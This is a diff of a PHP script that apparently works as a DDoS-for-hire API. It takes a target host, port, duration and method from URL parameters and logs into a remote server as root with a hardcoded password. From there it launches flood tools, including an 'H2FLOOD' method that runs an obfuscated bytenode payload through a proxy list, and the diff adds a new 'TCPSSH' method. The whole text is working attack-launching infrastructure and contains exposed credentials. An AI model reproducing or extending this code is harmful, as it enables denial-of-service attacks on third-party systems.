@@ -10,7 +10,7 @@ if(isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'], $_GET['ke
     $key = $_GET['key'];
 
     $username = 'root';
-    $ip = '134.209.111.3';
+    $ip = '152.42.203.209';
     $ports = '22';
     $password = 'leo@123';
 
@@ -21,6 +21,9 @@ if(isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'], $_GET['ke
     }
 
     switch ($method) {
+        case 'TCPSSH':
+            $command = "cd /var/www/html/test/ && screen -dm node tcpssh $host $port root $time";
+            break;
         case 'H2FLOOD':
             $command = "cd /var/www/html/test/ && screen -dm node -r bytenode loki.jsc $host $time 8 2 proxy.txt";
             break;
